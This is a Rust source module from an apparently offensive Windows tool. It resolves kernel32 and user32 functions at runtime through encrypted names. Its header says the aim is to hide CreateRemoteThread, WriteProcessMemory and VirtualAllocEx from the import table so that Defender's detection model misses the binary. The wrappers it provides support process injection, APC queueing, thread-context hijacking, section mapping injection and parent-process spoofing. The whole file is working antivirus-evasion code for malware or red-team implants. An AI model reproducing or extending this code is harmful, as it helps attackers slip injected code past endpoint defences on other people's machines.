// Dynamic API resolution — removes suspicious Win32 functions from the IAT.
//
// Only GetModuleHandleA and GetProcAddress stay in the import table (every
// legitimate binary imports these). All other APIs are resolved at runtime
// through encrypted names from obf.rs. Defender's ML model scores the IAT
// composition heavily; removing CreateRemoteThread, WriteProcessMemory,
// VirtualAllocEx, etc. from the IAT eliminates the primary static detection
// signal.
//
// ## How to use
//
// Instead of:
//   use windows::Win32::System::Memory::VirtualAlloc;
//   let p = unsafe { VirtualAlloc(None, size, MEM_COMMIT, PAGE_RW) };
//
// Do:
//   let p = unsafe { crate::resolve::VirtualAlloc(std::ptr::null(), size, 0x3000, 0x04) };
//
// Use raw u32 constants (MEM_COMMIT=0x1000, PAGE_READWRITE=0x04, etc.) since
// the windows crate's newtypes (.0 accessor) add noise. The constants are just
// u32 values — no IAT impact.

#[cfg(windows)]
use std::ffi::{c_void, CString};

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
}

#[cfg(windows)]
unsafe fn resolve(dll_enc: &[u8], func_enc: &[u8]) -> *mut c_void {
    let dll = crate::obf::s(dll_enc);
    let func = crate::obf::s(func_enc);
    let dll_c = CString::new(dll.as_str()).unwrap();
    let func_c = CString::new(func.as_str()).unwrap();
    let handle = GetModuleHandleA(dll_c.as_ptr() as *const u8);
    if handle.is_null() {
        return std::ptr::null_mut();
    }
    GetProcAddress(handle, func_c.as_ptr() as *const u8)
}

#[cfg(windows)]
unsafe fn resolve_load(dll_enc: &[u8], func_enc: &[u8]) -> *mut c_void {
    let dll = crate::obf::s(dll_enc);
    let func = crate::obf::s(func_enc);
    let dll_c = CString::new(dll.as_str()).unwrap();
    let func_c = CString::new(func.as_str()).unwrap();
    let mut handle = GetModuleHandleA(dll_c.as_ptr() as *const u8);
    if handle.is_null() {
        type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
        let k32 = CString::new(crate::obf::s(crate::obf::KERNEL32)).unwrap();
        let lla = CString::new(crate::obf::s(crate::obf::W_LOAD_LIBRARY_A)).unwrap();
        let k32h = GetModuleHandleA(k32.as_ptr() as *const u8);
        let lla_ptr = GetProcAddress(k32h, lla.as_ptr() as *const u8);
        if lla_ptr.is_null() {
            return std::ptr::null_mut();
        }
        let load_lib: FnLoadLibraryA = std::mem::transmute(lla_ptr);
        handle = load_lib(dll_c.as_ptr() as *const u8);
    }
    if handle.is_null() {
        return std::ptr::null_mut();
    }
    GetProcAddress(handle, func_c.as_ptr() as *const u8)
}

// Shorthand constants
#[cfg(windows)]
use crate::obf::{KERNEL32 as K32, USER32 as U32};

// ── kernel32 memory ──────────────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn VirtualAlloc(addr: *const c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_ALLOC));
    f(addr, size, alloc_type, protect)
}

#[cfg(windows)]
pub unsafe fn VirtualAllocEx(process: *mut c_void, addr: *const c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_ALLOC_EX));
    f(process, addr, size, alloc_type, protect)
}

#[cfg(windows)]
pub unsafe fn VirtualProtect(addr: *const c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32 {
    type F = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_PROTECT));
    f(addr, size, new_protect, old_protect)
}

#[cfg(windows)]
pub unsafe fn VirtualProtectEx(process: *mut c_void, addr: *const c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *mut u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_PROTECT_EX));
    f(process, addr, size, new_protect, old_protect)
}

#[cfg(windows)]
pub unsafe fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_FREE));
    f(addr, size, free_type)
}

#[cfg(windows)]
pub unsafe fn VirtualFreeEx(process: *mut c_void, addr: *mut c_void, size: usize, free_type: u32) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_VIRTUAL_FREE_EX));
    f(process, addr, size, free_type)
}

// ── kernel32 process memory ──────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn WriteProcessMemory(process: *mut c_void, base: *const c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, *const c_void, usize, *mut usize) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_WRITE_PROCESS_MEMORY));
    f(process, base, buf, size, written)
}

#[cfg(windows)]
pub unsafe fn ReadProcessMemory(process: *mut c_void, base: *const c_void, buf: *mut u8, size: usize, read: *mut usize) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, *mut u8, usize, *mut usize) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_READ_PROCESS_MEMORY));
    f(process, base, buf, size, read)
}

// ── kernel32 process / thread ────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_OPEN_PROCESS));
    f(access, inherit, pid)
}

#[cfg(windows)]
pub unsafe fn OpenThread(access: u32, inherit: i32, tid: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_OPEN_THREAD));
    f(access, inherit, tid)
}

#[cfg(windows)]
pub unsafe fn CloseHandle(handle: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CLOSE_HANDLE));
    f(handle)
}

#[cfg(windows)]
pub unsafe fn CreateRemoteThread(process: *mut c_void, attrs: *const c_void, stack_size: usize, start: *const c_void, param: *const c_void, flags: u32, tid: *mut u32) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize, *const c_void, *const c_void, u32, *mut u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_REMOTE_THREAD));
    f(process, attrs, stack_size, start, param, flags, tid)
}

#[cfg(windows)]
pub unsafe fn SuspendThread(thread: *mut c_void) -> u32 {
    type F = unsafe extern "system" fn(*mut c_void) -> u32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_SUSPEND_THREAD));
    f(thread)
}

#[cfg(windows)]
pub unsafe fn ResumeThread(thread: *mut c_void) -> u32 {
    type F = unsafe extern "system" fn(*mut c_void) -> u32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_RESUME_THREAD));
    f(thread)
}

#[cfg(windows)]
pub unsafe fn GetThreadContext(thread: *mut c_void, context: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_THREAD_CONTEXT));
    f(thread, context)
}

#[cfg(windows)]
pub unsafe fn SetThreadContext(thread: *mut c_void, context: *const c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_SET_THREAD_CONTEXT));
    f(thread, context)
}

#[cfg(windows)]
pub unsafe fn QueueUserAPC(apc_func: *const c_void, thread: *mut c_void, data: usize) -> u32 {
    type F = unsafe extern "system" fn(*const c_void, *mut c_void, usize) -> u32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_QUEUE_USER_APC));
    f(apc_func, thread, data)
}

#[cfg(windows)]
pub unsafe fn CreateProcessW(app: *const u16, cmd: *mut u16, proc_attrs: *const c_void, thread_attrs: *const c_void, inherit: i32, flags: u32, env: *const c_void, dir: *const u16, si: *const c_void, pi: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*const u16, *mut u16, *const c_void, *const c_void, i32, u32, *const c_void, *const u16, *const c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_PROCESS_W));
    f(app, cmd, proc_attrs, thread_attrs, inherit, flags, env, dir, si, pi)
}

#[cfg(windows)]
pub unsafe fn TerminateProcess(process: *mut c_void, exit_code: u32) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_TERMINATE_PROCESS));
    f(process, exit_code)
}

// ── kernel32 snapshot / enumeration ──────────────────────────────────────

#[cfg(windows)]
pub unsafe fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(u32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_TOOLHELP32_SNAPSHOT));
    f(flags, pid)
}

#[cfg(windows)]
pub unsafe fn Process32First(snapshot: *mut c_void, entry: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_PROCESS32_FIRST));
    f(snapshot, entry)
}

#[cfg(windows)]
pub unsafe fn Process32Next(snapshot: *mut c_void, entry: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_PROCESS32_NEXT));
    f(snapshot, entry)
}

#[cfg(windows)]
pub unsafe fn Thread32First(snapshot: *mut c_void, entry: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_THREAD32_FIRST));
    f(snapshot, entry)
}

#[cfg(windows)]
pub unsafe fn Thread32Next(snapshot: *mut c_void, entry: *mut c_void) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_THREAD32_NEXT));
    f(snapshot, entry)
}

// ── kernel32 thread attribute list (PPID spoofing) ───────────────────────

#[cfg(windows)]
pub unsafe fn InitializeProcThreadAttributeList(list: *mut c_void, count: u32, flags: u32, size: *mut usize) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, u32, u32, *mut usize) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_INIT_PROC_THREAD_ATTR_LIST));
    f(list, count, flags, size)
}

#[cfg(windows)]
pub unsafe fn UpdateProcThreadAttribute(list: *mut c_void, flags: u32, attr: usize, value: *const c_void, size: usize, prev: *mut c_void, ret_size: *mut usize) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, u32, usize, *const c_void, usize, *mut c_void, *mut usize) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_UPDATE_PROC_THREAD_ATTR));
    f(list, flags, attr, value, size, prev, ret_size)
}

#[cfg(windows)]
pub unsafe fn DeleteProcThreadAttributeList(list: *mut c_void) {
    type F = unsafe extern "system" fn(*mut c_void);
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_DELETE_PROC_THREAD_ATTR_LIST));
    f(list)
}

// ── kernel32 library loading ─────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn LoadLibraryA(name: *const u8) -> *mut c_void {
    type F = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_LOAD_LIBRARY_A));
    f(name)
}

#[cfg(windows)]
pub unsafe fn LoadLibraryExA(name: *const u8, file: *mut c_void, flags: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(*const u8, *mut c_void, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_LOAD_LIBRARY_EX_A));
    f(name, file, flags)
}

// ── kernel32 sync / wait ─────────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn WaitForSingleObject(handle: *mut c_void, ms: u32) -> u32 {
    type F = unsafe extern "system" fn(*mut c_void, u32) -> u32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_WAIT_FOR_SINGLE_OBJECT));
    f(handle, ms)
}

#[cfg(windows)]
pub unsafe fn GetExitCodeThread(thread: *mut c_void, exit_code: *mut u32) -> i32 {
    type F = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_EXIT_CODE_THREAD));
    f(thread, exit_code)
}

#[cfg(windows)]
pub unsafe fn Sleep(ms: u32) {
    type F = unsafe extern "system" fn(u32);
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_SLEEP));
    f(ms)
}

#[cfg(windows)]
pub unsafe fn GetLastError() -> u32 {
    type F = unsafe extern "system" fn() -> u32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_LAST_ERROR));
    f()
}

// ── kernel32 file mapping (section injection) ────────────────────────────

#[cfg(windows)]
pub unsafe fn CreateFileMappingW(file: *mut c_void, attrs: *const c_void, protect: u32, max_hi: u32, max_lo: u32, name: *const u16) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void, *const c_void, u32, u32, u32, *const u16) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_FILE_MAPPING_W));
    f(file, attrs, protect, max_hi, max_lo, name)
}

#[cfg(windows)]
pub unsafe fn MapViewOfFile(mapping: *mut c_void, access: u32, offset_hi: u32, offset_lo: u32, size: usize) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void, u32, u32, u32, usize) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_MAP_VIEW_OF_FILE));
    f(mapping, access, offset_hi, offset_lo, size)
}

#[cfg(windows)]
pub unsafe fn MapViewOfFileNuma2(mapping: *mut c_void, process: *mut c_void, offset: u64, base: *const c_void, size: usize, alloc_type: u32, protect: u32, node: u32) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void, *mut c_void, u64, *const c_void, usize, u32, u32, u32) -> *mut c_void;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_MAP_VIEW_OF_FILE_NUMA2));
    f(mapping, process, offset, base, size, alloc_type, protect, node)
}

#[cfg(windows)]
pub unsafe fn UnmapViewOfFile(base: *const c_void) -> i32 {
    type F = unsafe extern "system" fn(*const c_void) -> i32;
    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_UNMAP_VIEW_OF_FILE));
    f(base)
}

// ── user32 ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub unsafe fn EnumWindows(callback: *const c_void, lparam: isize) -> i32 {
    type F = unsafe extern "system" fn(*const c_void, isize) -> i32;
    let f: F = std::mem::transmute(resolve(U32, crate::obf::W_ENUM_WINDOWS));
    f(callback, lparam)
}
